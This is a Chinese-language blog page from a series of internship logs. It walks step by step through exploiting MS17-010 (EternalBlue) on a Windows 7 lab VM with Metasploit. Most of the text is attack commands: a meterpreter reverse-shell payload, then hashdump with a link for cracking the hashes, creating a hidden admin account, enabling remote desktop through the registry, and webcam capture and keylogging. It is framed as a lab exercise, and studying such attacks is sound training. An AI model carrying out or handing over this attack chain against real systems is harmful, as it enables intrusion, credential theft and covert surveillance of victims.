@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>第4天实习日志 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  <meta name="description" content="主要学习内容永恒之蓝实验环境 软件：VMware Workstation Pro 虚拟机：kali-linux、windows7（要求网络适配器开启桥接模式）  进行实验 在kali-linux中打开终端使用命令查看ip地址，检测是否互通 1ifconfig  在Windows7中打开终端，查看ip地址 1ipconfig  kali中使用ping命令，测试两台虚拟机是否能连通（把用户添加到管理员">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第4天实习日志">
+<meta property="og:url" content="http://example.com/2023/11/10/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-4/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="主要学习内容永恒之蓝实验环境 软件：VMware Workstation Pro 虚拟机：kali-linux、windows7（要求网络适配器开启桥接模式）  进行实验 在kali-linux中打开终端使用命令查看ip地址，检测是否互通 1ifconfig  在Windows7中打开终端，查看ip地址 1ipconfig  kali中使用ping命令，测试两台虚拟机是否能连通（把用户添加到管理员">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110165910401.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110201705196.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110172607243.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110202238672.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110203408567.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110203430920.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110204353109.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110205042876.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110205057925.png">
+<meta property="article:published_time" content="2023-11-10T09:30:22.000Z">
+<meta property="article:modified_time" content="2023-11-10T13:00:06.504Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110165910401.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/default-avatar.jpg">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/highlight.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="fullpage" class="mobile-nav-right">
+    
+      <div id="wrapper" title="图片来自网络">
+    
+    
+      <header id="header">
+  <div id="nav-toggle" class="nav-toggle"></div>
+  <div class="head-box global-width">
+    <nav class="nav-box nav-right">
+      
+        <a class="nav-item" href="/" title
+        
+        >首页</a>
+      
+        <a class="nav-item" href="/archives" title
+        
+        >归档</a>
+      
+    </nav>
+  </div>
+</header>
+      <div id="middlecontent" title class="global-width sidebar-right">
+        <section id="main"><article id="post-我的博客-4" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      第4天实习日志
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2023/11/10/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-4/" class="article-date">
+  <time datetime="2023-11-10T09:30:22.000Z" itemprop="datePublished">2023-11-10</time>
+</a>
+    
+    
+  </div>
+  
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <h1 id="主要学习内容"><a href="#主要学习内容" class="headerlink" title="主要学习内容"></a>主要学习内容</h1><h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ol>
+<li>软件：VMware Workstation Pro</li>
+<li>虚拟机：kali-linux、windows7（要求网络适配器开启桥接模式）</li>
+</ol>
+<h3 id="进行实验"><a href="#进行实验" class="headerlink" title="进行实验"></a>进行实验</h3><ol>
+<li><p>在kali-linux中打开终端使用命令查看ip地址，检测是否互通</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>在Windows7中打开终端，查看ip地址</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>kali中使用ping命令，测试两台虚拟机是否能连通（把用户添加到管理员组&#x2F;开启远程管理服务&#x2F;监听键盘&#x2F;登录同桌的远程桌面)</p>
+</li>
+</ol>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.0.33</span><br></pre></td></tr></table></figure></div>
+
+<ol start="4">
+<li><p>启动msf（非root登录需sudo提升权限）</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>查看漏洞模块</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110165910401.png" alt="image-20231110165910401"></p>
+</li>
+<li><p>进入扫描模块</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 3</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>查看参数</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110201705196.png" alt="image-20231110201705196"></p>
+</li>
+<li><p>设置被攻击的ip和攻击机的ip</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.0.33</span><br><span class="line">set lhosts 192.168.0.39</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>进行攻击</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set payload  windows/x64/meterpreter/reverse_tcp //设置攻击载荷</span><br><span class="line">exploit/run //使用exploit或run进行攻击</span><br></pre></td></tr></table></figure></div>
+
+<p>运行成功结果如下图所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110172607243.png" alt="image-20231110172607243"></p>
+</li>
+<li><p>出现如下显示（meterpreter是Metasploit的一个扩展模块，可以调用Metasploit的一些功能，对目标系统进行入的渗透，如获取屏幕、上传&#x2F;下载文件、创建持久后门等。）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110202238672.png" alt="image-20231110202238672"></p>
+</li>
+<li><p>利用MS17-010漏洞，对目标系统进行渗透</p>
+<ul>
+<li><p>漏洞利用1：成功获得管理员权限</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysinfo //如果出现回显信息乱码，可尝试执行chcp 65001进行转换编码</span><br><span class="line">shell </span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110203408567.png" alt="image-20231110203408567"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110203430920.png" alt="image-20231110203430920"></p>
+</li>
+</ul>
+</li>
+<li><p>漏洞利用2：执行如下命令，通过 meterpreter 获取屏幕快照</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>漏洞利用3：上传文件到Windows主机</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /home/kali/bg.jpg c:/windows/temp      //将root目录下的bg.jpg文件上传到windows7主机中</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>漏洞利用4：从Windows主机中下载文件到kali中</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; download C:/users/x1a0/desktop/passwd.txt /home/kali/  //先确保C:/users/x1a0/desktop路径存在passwd.txt文件，若没有，请先建立</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>漏洞利用5：利用刚拿到的shell执行权限提权，通过shell对靶机Win7进行控制，此时我们输入getuid查看权限得知权限为管理员权限</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid  //查看权限</span><br><span class="line">meterpreter &gt; hashdump  </span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110204353109.png" alt="image-20231110204353109"></p>
+<p>显示如上图，则表示已成功获得Windows用户名和登录密码,将红框中字符复制粘贴到如下网站，进行破密。</p>
+<p>[密码破解网站](<a target="_blank" rel="noopener" href="https://cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a>)</p>
+</li>
+<li><p>漏洞利用6：shell 新增账户并远程登陆目标主机</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line">C:\WINDOWS\system32&gt;net user admin admin /add        //新建用户admin 密码也是admin</span><br><span class="line">C:\WINDOWS\system32&gt;net localgroup Administrators admin /add        //将admin用户添加到administrator组</span><br><span class="line">C:\WINDOWS\system32&gt;net user admin /active:yes        </span><br><span class="line">开启远程管理服务</span><br><span class="line">C:\Windows\system32&gt;reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></div>
+
+<p>测试：通过物理机远程登录目标主机（windows7）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110205042876.png" alt="image-20231110205042876"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231110205057925.png" alt="image-20231110205057925"></p>
+</li>
+<li><p>漏洞利用7：开启摄像头</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list   //查看摄像头</span><br><span class="line">webcam_snap   //通过摄像头拍照</span><br><span class="line">webcam_stream //通过摄像头开启视频</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>漏洞利用8：键盘监听</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps   //看（explorer.exe）进程号</span><br><span class="line">migrate 1892  //（进程号） 迁移</span><br><span class="line">keyscan_start   //键盘监听</span><br><span class="line">keyscan_dump   //看键盘输入了什么</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+
+      
+    </div>
+    
+      <footer class="article-footer">
+        完
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  <div class="article-nav-block">
+    
+  </div>
+  <div class="article-nav-block">
+    
+      <a href="/2023/11/09/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%20-%203/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">第3天实习日志</div>
+        <strong class="article-nav-caption"></strong>
+      </a>
+    
+  </div>
+</nav>
+
+    <link rel="stylesheet" href="/css/gitment.css"> 
+<script src="/js/gitment.js"></script>
+
+<div id="gitmentContainer"></div>
+
+<script>
+var gitment = new Gitment({
+  owner: '',
+  repo: '',
+  oauth: {
+    client_id: '',
+    client_secret: '',
+  },
+})
+gitment.render('gitmentContainer')
+</script>
+
+  
+  
+</article>
+</section>
+        <aside id="sidebar">
+  
+    <div class="widget-box">
+  <div class="avatar-box">
+    <img class="avatar" src="/images/default-avatar.jpg" title="图片来自网络"></img>
+    <h3 class="avatar-name">
+      
+        volcano
+      
+    </h3>
+    <p class="avatar-slogan">
+      特别耐撕的小前端，资深的打酱油攻城狮。
+    </p>
+  </div>
+</div>
+
+
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/11/10/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-4/">第4天实习日志</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/09/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%20-%203/">第3天实习日志</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/08/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-2/">第2天实习日志</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/07/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-1/">第1天实习日志</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/07/volcano/">volcano</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+      <div class="widget-box">
+    <h3 class="widget-title">友链</h3>
+    <div class="widget">
+      
+        <a style="display: block;" href="https://yiluyanxia.github.io/" title target='_blank'
+        >一路眼瞎</a>
+      
+    </div>
+  </div>
+
+  
+</aside>
+      </div>
+      <footer id="footer">
+  <div class="foot-box global-width">
+    &copy; 2023 John Doe &nbsp;&nbsp;
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    &nbsp;|&nbsp;主题 <a target="_blank" rel="noopener" href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
+  </div>
+</footer>
+      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
+<script>
+if (!window.jQuery) {
+var script = document.createElement('script');
+script.src = "/js/jquery-2.0.3.min.js";
+document.body.write(script);
+}
+</script>
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+    </div>
+    <nav id="mobile-nav" class="mobile-nav-box">
+  <div class="mobile-nav-img mobile-nav-top"></div>
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+  <div class="mobile-nav-img  mobile-nav-bottom"></div>
+</nav>    
+  </div>
+</body>
+</html>
